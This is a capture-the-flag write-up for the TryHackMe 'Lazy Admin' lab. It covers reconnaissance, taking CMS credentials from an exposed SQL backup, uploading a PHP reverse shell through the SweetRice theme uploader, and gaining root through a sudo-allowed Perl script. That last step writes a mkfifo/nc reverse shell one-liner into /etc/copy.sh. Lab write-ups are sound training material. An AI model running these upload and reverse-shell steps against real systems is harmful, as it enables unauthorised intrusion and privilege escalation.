```bash
# PLATFORM          . THM
# CTF NAME          . Lazy Admin
# DESCRIPTION       . Easy linux machine to practice your skills
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/lazyadmin
```

```bash
sudo nmap -sSVC -T5 10.10.151.163 -p- -oN LazyAdmin 
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 497cf741104373da2ce6389586f8e0f0 (RSA)
|   256 2fd7c44ce81b5a9044dfc0638c72ae55 (ECDSA)
|_  256 61846227c6c32917dd27459e29cb905e (ED25519)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- I also started `ffuf` while the `nmap` scan was running.

```bash
ffuf -u http://10.10.151.163/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
```

```
content                 [Status: 301, Size: 316, Words: 20, Lines: 10]
```

- The root path on the webserver is just the default apache installation, but we hit the jackpot once we go to `/content`.

```


Welcome to SweetRice - Thank your for install SweetRice as your website management system.
This site is building now , please come late.

If you are the webmaster,please go to Dashboard -> General -> Website setting

and uncheck the checkbox "Site close" to open your website.

More help at Tip for Basic CMS SweetRice installed
```

- Fuzzing through `ip/content/FUZZ` one more time, we find additional pages:

```
js                      [Status: 301, Size: 320, Words: 20, Lines: 10]
images                  [Status: 301, Size: 320, Words: 20, Lines: 10]
inc                     [Status: 301, Size: 320, Words: 20, Lines: 10]
as                      [Status: 301, Size: 319, Words: 20, Lines: 10]
_themes                 [Status: 301, Size: 324, Words: 20, Lines: 10]
attachment              [Status: 301, Size: 327, Words: 20, Lines: 10]
```

- I didn't spend too much time looking in each file that I found, but here's the summary
	
	- `js` contains a bunch of `.js` (duuuh!) files I didn't take a look into.
	
	- `images` - images and `captcha.php`
	
	- `attachment` - empty
	
	- `inc` - a bunch of `.php` files ; in the `mysql_backup` we're able to find and download a `.sql` file and in the `cache` file to download `cache.db`.
	
	- `as` - Sweet Rice CMS Login Panel


- I took a look at the `mysql_backup` file and I've noticed that it is in ASCII.

```bash
file mysql_bakup_20191129023059-1.5.1.sql 

mysql_bakup_20191129023059-1.5.1.sql: PHP script, ASCII text, with very long lines (1125)
```

- Inside, we're able to find the credentials needed for the Login Panel.

![[Pasted image 20231124203720.png]]

- That is an `MD5 Hash` and represents the hash for `Password123` password. Credentials: `manager:Password123`

- I also took a look into `cache.db` because of pure curiosity, and I've noticed that `sqlite3` doesn't help.

```bash
file cache.db 

cache.db: Berkeley DB (Btree, version 9, native byte-order)
```

- After some quick reseach, I found out that I need to use have `db-utils` package installed in order to use `db_dump` on that `.db`.

```bash
db_dump cache.db 

VERSION=3
format=bytevalue
type=btree
db_pagesize=4096
HEADER=END
 64625f61727261795f3265313035323534626532656366656461626163363638363864636563396236
 313537353032333430392f
 64625f61727261795f6336656162356265366334356438613038383465646535613536633564376433
 313537353032333430392f
 64625f61727261795f6364326264313238643533396638316637326562376562363331646438306332
 313537353032333430392f
DATA=END
```

- I had no idea what this data represents, and considering that I already found the account needed, I assumed there's little need to further investigate this (most probably) rabbit hole.

- Back to our manager account, after we logged in I started looked around for a place to upload things, hopefully a reverse shell.

- I went to `General -> Dashboard` and activated the website, wanted to see how it looks like. ugly.

- I also did that because I wanted to change the default theme so instead of the content in the `main.php`, I would execute a php reverse shell.

- But then I realised I don't need an entire theme for that and I've just used [pentestmonkey's php reverse shell](https://github.com/pentestmonkey/php-reverse-shell). 

- I have uploaded the shell from the CMS, Themes menu. I added the `.php` file directly, and I took a look in `ip/content/_themes` ; there was a folder called `shell.php` (the name of my file) but it was empty ;

- The trick was to first `zip` the `shell.php` and then upload it. It was also written on the website, but meh, I didn't see it.

- Navigating to `ip/content/_themes/archive_name/shell.php` after starting a listener will grant us a reverse shell.

```
connect to [10.xx.xx.xx] from (UNKNOWN) [10.10.138.130] 55604
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 20:59:55 up 7 min,  0 users,  load average: 0.02, 0.31, 0.25
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

- Before continuing, I want to state that there were also other methods of getting a reverse shell. Take a look at [this](https://www.exploit-db.com/exploits/40716) exploit and [this](https://www.exploit-db.com/exploits/40700) exploit. I just wanted to find other ways :D 

- Back to our fresh reverse shell - we're under `www-data` user.

- Stabilise the shell

```
python -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm

<CTRL + Z>
stty raw -echo; fg
```

- The first flag is located at `/home/itguy/user.txt`.

- A file called `mysql_login.txt` is located in the same path, but I knew these credentials from some time already. You can find them in the CMS by going to `Settings -> General`. You can even change the password of the current user, create a new site with another admin, and so on.

```
rice:randompass
```

**DISCLAIMER**:  **DO NOT** click on *Update* in the menu ; the webserver will crash :) Don't ask how I found out.

- The privilege escalation vector I found was quite straight forward. 

- The user had `sudo` permissions for `/usr/bin/perl`.

```
www-data@THM-Chal:/tmp$ sudo -l

Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

- There is also a "backup" Perl script in `/home/itguy/backup.pl` 

```backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

```copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

- All I had to do was to replace the ip in the script with my own and start a listener on the port. Then, run the `backup.pl` script as `sudo`.

```bash
www-data@THM-Chal:/tmp$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.53.46 5555 >/tmp/f" > /etc/copy.sh
```

```bash
www-data@THM-Chal:/tmp$ sudo /usr/bin/perl /home/itguy/backup.pl
```

- The last flag is located in `/root/root.txt` ; 